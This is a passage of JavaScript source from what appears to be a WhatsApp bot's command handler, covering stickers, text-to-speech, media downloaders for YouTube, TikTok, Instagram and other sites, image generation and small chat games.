					XeonBotInc.sendMessage(m.chat, { image: buffer }, { quoted: m })
					fs.unlinkSync(ran)
				})
			}
			break
			case 'toptv': {
				if (!/video/.test(mime)) return replygcxeon(`Send/Reply the video you want to use as a PTV message with caption ${prefix + command}`)
				if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
					const anu = await (m.quoted ? m.quoted.download() : m.download())
					const msg = await generateWAMessageContent({ video: anu }, { upload: XeonBotInc.waUploadToServer })
					await XeonBotInc.relayMessage(m.chat, { ptvMessage: msg.videoMessage }, {})
				} else {
					replygcxeon('Reply Videos You Want to Convert to PTV Messages!')
				}
			}
			break
			case 'tourl': {
				let { fileIO, TelegraPh } = require('./lib/uploader')
				if (/jpg|jpeg|png/.test(mime)) {
					XeonStickWait()
					let media = await (m.quoted ? m.quoted.download() : m.download())
					let anu = await TelegraPh(media)
					replygcxeon('Url : ' + anu)
				} else if (/webp|video|sticker|audio/.test(mime)) {
					XeonStickWait()
					let media = await (m.quoted ? m.quoted.download() : m.download())
					let anu = await UploadFileUgu(media)
					replygcxeon('Url : ' + anu.url)
				} else {
					replygcxeon('Send the media you want to upload!')
				}
			}
			break
			case 'texttospeech-indo': case 'tts-indo': case 'ttsindo': {
				if (!text) return replygcxeon('Where is the text you want to convert to audio??')
				let { tts } = require('./lib/tts')
				let anu = await tts(text)
				XeonBotInc.sendMessage(m.chat, { audio: anu, ptt: true, mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break
			case 'say': case 'tts': case 'gtts':{
if (!text) return replygcxeon('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return XeonBotInc.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
			case 'toqr': case 'qr': {
				if (!text) return replygcxeon(`Please include a text or link\n\nFor Example:\n*${prefix + command}* wassup`)
				XeonStickWait()
				await XeonBotInc.sendMessage(m.chat, { image: { url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + text }, caption: 'Here you go!' }, { quoted: m })
			}
			break
			case 'ssweb': {
				if (!text) return replygcxeon(`Example: ${prefix + command} https://github.com/DGXeon`)
				if (!text.startsWith('http')) {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/https://' + q;
					await XeonBotInc.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				} else {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q;
					await XeonBotInc.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				}
			}
			break
			case'smeta': {
if (!/webp/.test(mime)) return replygcxeon('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await XeonBotInc.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replygcxeon('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `Cheems Bot`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) XeonBotInc.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replygcxeon('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
			case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break
			case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replygcxeon(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
memek = await XeonBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
replygcxeon(`Send/reply image with caption ${prefix + command} text1|text2`)
}
}
break
			case 'write': {
				replygcxeon(`*Example*\n${prefix}writeleft text\n${prefix}writeright text\n${prefix}folioleft text\n${prefix}folioright text`)
			}
			break
			case 'writeleft': {
				if (!text) return replygcxeon(`Send command *${prefix + command}* text`)
				XeonStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/write/images/book/beforeleft.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./src/write/images/book/afterleft.jpg'
				])
				.on('error', () => replygcxeon(mess.error))
				.on('exit', () => {
					XeonBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			case 'writeright': {
				if (!text) return replygcxeon(`Send command *${prefix + command}* text`)
				XeonStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/write/images/book/beforeright.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+128+129',
					fixHeight,
					'./src/write/images/book/afterright.jpg'
				])
				.on('error', () => replygcxeon(mess.error))
				.on('exit', () => {
					XeonBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			case 'folioleft': {
				if (!text) return replygcxeon(`Send command *${prefix + command}* text`)
				XeonStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/write/images/folio/beforeleft.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+48+185',
					fixHeight,
					'./src/write/images/folio/afterleft.jpg'
				])
				.on('error', () => replygcxeon(mess.error))
				.on('exit', () => {
					XeonBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			case 'folioright': {
				if (!text) return replygcxeon(`Send command *${prefix + command}* text`)
				XeonStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/write/images/folio/beforeright.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+89+190',
					fixHeight,
					'./src/write/images/folio/afterright.jpg'
				])
				.on('error', () => replygcxeon(mess.error))
				.on('exit', () => {
					XeonBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			
			// Ai Menu
			case 'ai2': case 'gpt2': case 'openai2': {
				if (!text) return replygcxeon(`Example: ${prefix + command} query`)
				const hasil = await chatGpt(text);
				replygcxeon(hasil)
			}
			break
			// Search Menu
			case 'play':  case 'song': {
if (!text) return replygcxeon(`Example : ${prefix + command} anime whatsapp status`)
try {
const xeonplaymp3 = require('./lib/ytdl')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            sourceUrl: websitex,
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}catch{
	replygcxeon(`Music not found.`)
	}
}
break
			
			case 'pixiv': {
				if (!text) return replygcxeon(`Example: ${prefix + command} hello`)
				try {
					let { pixivdl } = require('./lib/pixiv')
					let res = await pixivdl(text)
					XeonStickWait()
					for (let i = 0; i < res.media.length; i++) {
						let caption = i == 0 ? `${res.caption}\n\n*By:* ${res.artist}\n*Tags:* ${res.tags.join(', ')}` : ''
						let mime = (await FileType.fromBuffer(res.media[i])).mime 
						await XeonBotInc.sendMessage(m.chat, { [mime.split('/')[0]]: res.media[i], caption, mimetype: mime }, { quoted: m })
					}
				} catch (e) {
					replygcxeon('Search Not found!')
				}
			}
			break
			case 'pinterest': case 'pin': {
  if (!text) return replygcxeon(`Title?`);
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: XeonBotInc.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Randomize arrays
  let ult = res.splice(0, 5); // Takes the first 10 images from a randomized array
  let i = 1;
  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `_*Here is the result of: ${text}*_`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: botname
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `Image - ${i++}`,
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }
  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {quoted:m});
  await XeonBotInc.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break
			case 'wallpaper': {
                if (!text) return replygcxeon('Enter Query Title')
                await XeonStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: XeonBotInc.waUploadToServer })
          }), 
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})                
            }
            break
			case 'ringtone': {
				if (!text) return replygcxeon(`Example: ${prefix + command} black rover`)
				let anu = await ringtone(text)
				let result = pickRandom(anu)
				await XeonBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title + '.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break
			
			// Downloader Menu
case 'ytmp3': case 'ytaudio': case 'ytplayaudio': {
				if (!text) return replygcxeon(`Example: ${prefix + command} youtube_url`)
				if (!text.includes('youtu')) return replygcxeon('The URL does not contain results from YouTube!')
				const hasil = await ytMp3(text);
				XeonStickWait()
				await XeonBotInc.sendMessage(m.chat, {
					audio: { url: hasil.result },
					mimetype: 'audio/mpeg',
					contextInfo: {
						externalAdReply: {
							title: hasil.title,
							body: hasil.channel,
							previewType: 'PHOTO',
							thumbnailUrl: hasil.thumb,
							mediaType: 1,
							renderLargerThumbnail: true,
							sourceUrl: text
						}
					}
				}, { quoted: m });
			}
			break
			case 'ytmp4': case 'ytvideo': case 'ytplayvideo': {
				if (!text) return replygcxeon(`Example: ${prefix + command} url_youtube`)
				if (!text.includes('youtu')) return replygcxeon('The link is not a youtube link!')
				const hasil = await ytMp4(text);
				XeonStickWait()
				await XeonBotInc.sendMessage(m.chat, { video: { url: hasil.result }, caption: `*📍Title:* ${hasil.title}\n*✏Description:* ${hasil.desc ? hasil.desc : ''}\n*🚀Channel:* ${hasil.channel}\n*🗓Upload at:* ${hasil.uploadDate}` }, { quoted: m });
			}
			break
			case 'apk': {
	try {
    if (command === 'apk') {
      if (!text) return replygcxeon(`*[❗] Please provide the APK Name you want to download.*`);
      let data = await download(text);
      if (data.size.replace(' MB', '') > 200) {
        return await XeonBotInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }
      if (data.size.includes('GB')) {
        return await XeonBotInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }
      await XeonBotInc.sendMessage(
        m.chat,
        { document: { url: data.dllink }, mimetype: 'application/vnd.android.package-archive', fileName: data.name + '.apk', caption: null },
        { quoted: m }
      )
    }
  } catch {
    return replygcxeon(`*[❗] An error occurred. Make sure to provide a valid link.*`);
  }
};
break
case 'mega':{
	try {
if (!text) return replygcxeon(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
const { File } = require('megajs');
        const file = File.fromURL(text);
        await file.loadAttributes();
        if (file.size >= 300000000) return replygcxeon('Error: File size is too large (Maximum Size: 300MB)');
        const downloadingMessage = `🌩️ Downloading file... Please wait.`;
        replygcxeon(downloadingMessage);
        const caption = `*_Successfully downloaded..._*\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
        const data = await file.downloadBuffer();
        const fileExtension = path.extname(file.name).toLowerCase();
        const mimeTypes = {
            ".mp4": "video/mp4",
            ".pdf": "application/pdf",
            ".zip": "application/zip",
            ".rar": "application/x-rar-compressed",
            ".7z": "application/x-7z-compressed",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
        };
        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
        await XeonBotInc.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
    } catch (error) {
        return replygcxeon(`Error: ${error.message}`);
    }
}
break
			case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return replygcxeon(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return replygcxeon('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: te
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url:HD}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  	replygcxeon(`Verify that the link is from Twitter`)
	}
}
break
			case 'fb':
           case 'facebook':
case 'facebookvid': {
           if (!args[0]) {
    return replygcxeon(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replygcxeon('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    XeonBotInc.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replygcxeon('Maybe private video!')
  }
  }
  break
			case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return replygcxeon(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return replygcxeon(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return replygcxeon(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: mediaURL}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
    } else if (mediaType === 'image') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: mediaURL}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
    }
  }
}
break
			case 'tiktok': case 'tiktokdown': case 'ttdown': case 'ttdl': case 'tt': case 'ttmp4': case 'ttvideo': case 'tiktokmp4': case 'tiktokvideo': {
				if (!text) return replygcxeon(`Example: ${prefix + command} url_tiktok`)
				if (!text.includes('tiktok.com')) return replygcxeon('Url Tidak Mengandung Result Dari Tiktok!')
				const hasil = await tiktokDl(text);
				XeonStickWait()
				if (hasil.size_nowm) {
					await XeonBotInc.sendFileUrl(m.chat, hasil.data[1].url, `*📍Title:* ${hasil.title}\n*⏳Duration:* ${hasil.duration}\n*🎃Author:* ${hasil.author.nickname} (@${hasil.author.fullname})`, m)
				} else {
					for (let i = 0; i < hasil.data.length; i++) {
						await XeonBotInc.sendFileUrl(m.chat, hasil.data[i].url, `*🚀Image:* ${i+1}`, m)
					}
				}
			}
			break
			case 'ttmp3': case 'tiktokmp3': case 'ttaudio': case 'tiktokaudio': {
				if (!text) return replygcxeon(`Example: ${prefix + command} url_tiktok`)
				if (!text.includes('tiktok.com')) return replygcxeon('Url Tidak Mengandung Result Dari Tiktok!')
				const hasil = await tiktokDl(text);
				XeonStickWait()
				await XeonBotInc.sendMessage(m.chat, {
					audio: { url: hasil.music_info.url },
					mimetype: 'audio/mpeg',
					contextInfo: {
						externalAdReply: {
							title: 'TikTok • ' + hasil.author.nickname,
							body: hasil.stats.likes + ' suka, ' + hasil.stats.comment + ' komentar. ' + hasil.title,
							previewType: 'PHOTO',
							thumbnailUrl: hasil.cover,
							mediaType: 1,
							renderLargerThumbnail: true,
							sourceUrl: text
						}
					}
				}, { quoted: m });
			}
			break
			
			// Fun Menu
			case 'dice': {
				let ddsa = [{ url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png', no: 1 },{ url: 'https://telegra.ph/file/797f86e444755282374ef.png', no: 2 },{ url: 'https://telegra.ph/file/970d2a7656ada7c579b69.png', no: 3 },{ url: 'https://telegra.ph/file/0470d295e00ebe789fb4d.png', no: 4 },{ url: 'https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png', no: 5 },{ url: 'https://telegra.ph/file/99dcd999991a79f9ba0c0.png', no: 6 }]
				let media = pickRandom(ddsa)
				await XeonBotInc.sendImageAsSticker(m.chat, media.url, m, { packname: global.packname, author: global.author, isAvatar: 1 })
			}
			break
			
			// Game Menu
			case 'slot': {
				await gameSlot(XeonBotInc, m, global.db.users)
			}
			break
			case 'casino': {
				await gameCasinoSolo(XeonBotInc, m, prefix, global.db.users)
			}
			break
			case 'robber': case 'rob': {
				await gameMerampok(m, global.db.users)
			}
			break
			case 'suitpvp': case 'suit': {
				let poin = 10
				let poin_lose = 10
				let timeout = 60000
				if (Object.values(game.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcxeon(`Finish your previous suit`)
				if (m.mentionedJid[0] === m.sender) return replygcxeon(`Can't play with myself !`)
				if (!m.mentionedJid[0]) return replygcxeon(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[0]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
				if (Object.values(game.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcxeon(`The person you are challenging is playing suit with someone else :(`)
				let id = 'suit_' + new Date() * 1
				let caption = `_*SUIT PvP*_\n\n@${m.sender.split`@`[0]} challenge @${m.mentionedJid[0].split`@`[0]} to play suits\n\nPlease @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
				game.suit[id] = {
					chat: replygcxeon(caption),
					id: id,
					p: m.sender,
					p2: m.mentionedJid[0],
					status: 'wait',
					waktu: setTimeout(() => {
						if (game.suit[id]) replygcxeon(`_Suit time is up_`)
						delete game.suit[id]
					}, 60000), poin, poin_lose, timeout
				}
			}
			break
			case 'ttc': case 'ttt': case 'tictactoe': {
				let TicTacToe = require('./lib/tictactoe');
				if (Object.values(game.tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcxeon(`You are still in the game!\nType *${prefix}del${command}* If you want to end the session`);
				let room = Object.values(game.tictactoe).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
				if (room) {
					replygcxeon('Partner found!')
					room.o = m.chat
					room.game.playerO = m.sender
					room.state = 'PLAYING'
					let arr = room.game.render().map(v => {
						return {X: '❌',O: '⭕',1: '1️⃣',2: '2️⃣',3: '3️⃣',4: '4️⃣',5: '5️⃣',6: '6️⃣',7: '7️⃣',8: '8️⃣',9: '9️⃣'}[v]
					})
					let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\nWaiting @${room.game.currentTurn.split('@')[0]}\n\nType *surrender* to give up and admit defeat`
					if (room.x !== room.o) await XeonBotInc.sendMessage(room.x, { texr: str, mentions: parseMention(str) }, { quoted: m })
					await XeonBotInc.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m })
				} else {
					room = {
						id: 'tictactoe-' + (+new Date),
						x: m.chat,
						o: '',
						game: new TicTacToe(m.sender, 'o'),
						state: 'WAITING',
						waktu: setTimeout(() => {
							if (game.tictactoe[roomnya.id]) replygcxeon(`_Time ${command} finished_`)
							delete game.tictactoe[roomnya.id]
						}, 300000)
					}
					if (text) room.name = text
					XeonBotInc.sendMessage(m.chat, { text: 'Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''), mentions: m.mentionedJid }, { quoted: m })
					game.tictactoe[room.id] = room
				}
			}
			break
			case 'playbomb': case 'bomb': {
				if (game.tebakbom[m.sender]) return replygcxeon('There Are Still Unfinished Sessions!')
				function shuffle(array) {
					return array.sort(() => Math.random() - 0.5);
				}
				game.tebakbom[m.sender] = {
					petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
					board: ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'],
					bomb: 3,
					lolos: 7,
					pick: 0,
					nyawa: ['❤️', '❤️', '❤️'],
					waktu: setTimeout(() => {
						if (game.tebakbom[m.sender]) replygcxeon(`_Time ${command} finished_`)
